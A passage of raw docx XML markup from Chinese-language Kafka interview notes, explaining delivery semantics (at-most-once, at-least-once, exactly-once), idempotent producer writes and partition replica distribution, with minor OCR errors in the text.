        <w:t>的网 络异常，没有返回</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ACK,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Producer,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>认为数据没有写入成功，此时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>producer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>会再次 与入，相当于一条数据，被写入了多次。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="800" w:right="0" w:hanging="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>at most once:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>最多消费一次，对于消息，有可能消费一次，有可能一次也消费不了 原因：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>producer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>在产生数据的时候，有可能写数据的时候不成功，此时</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>broker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>就</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>跳过这个消息，那么这条数据就会丢失，导致</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>无法消费。</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>exactly once:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">有且仅有一次。这种情况是我们所需要的，也就是精准消费一次。 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>2-kafka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中消费语义的场景</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>at last once</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:可以先读取数据，处理数据，最后记录</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>offset,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>当然如果在记录</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">offset </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>之前就</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>crash,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>新的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>会重复的来消费这条数据，导致了”最少一次“</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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>at most once:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>可以先读取数据，然后记录</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>offset,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>最后在处理数据，这个方式，就 有可能在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>offset</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>后，还没有及时的处理数据，就</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>crash?,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>导致了新的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>consumer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>继续 从这个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>offset</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>处理，那么刚刚还没来得及处理的数据，就永远不会被处理，导致了” 最多消费一次“</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>exactly once:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">可以通过将提交分成两个阶段来解决：保存了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>offset</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>后提交一次，消 息处理成功后，再提交一次。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="735"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="79" w:name="bookmark85"/>
      <w:bookmarkEnd w:id="79"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>kafka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中如何实现精准写入数据？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="40" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>A： Producer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>端写入数据的时候保证幕等性操作：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="800" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>幕等性：对于同一个数据无论操作多少次都只写入一条数据，如果重复写入，则执 行不成功</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>B： broker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>写入数据的时候，保证原子性操作，要么写入成功，要么写入失败。（不成 功不断进行重试）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="9"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="80" w:name="bookmark86"/>
      <w:bookmarkStart w:id="81" w:name="bookmark87"/>
      <w:bookmarkStart w:id="82" w:name="bookmark88"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>14. kafka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>partition</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>的工作原理？</w:t>
      </w:r>
      <w:bookmarkEnd w:id="80"/>
      <w:bookmarkEnd w:id="81"/>
      <w:bookmarkEnd w:id="82"/>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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Kafka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>集群</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>partition replication</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>默认自动分配分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>下面以</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Kafka</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>集群中4个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Broker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>举例，创建1个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>topic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>包含4个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Partition, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Replication;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>数据</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Pr o due er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>流动如图戶尸示：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="2"/>
          <w:szCs w:val="2"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5048250" cy="1866900"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="30" name="Picutre 30"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="30" name="Picutre 30"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId33"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5048250" cy="1866900"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>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当集群中新増2节点，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Partition</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>増加到6个时分布情况如下:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="1" w:lineRule="exact"/>
        <w:sectPr>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1357" w:right="1781" w:bottom="1413" w:left="1778" w:header="0" w:footer="985" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="2"/>
          <w:szCs w:val="2"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="5000625" cy="1743075"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="31" name="Picutre 31"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
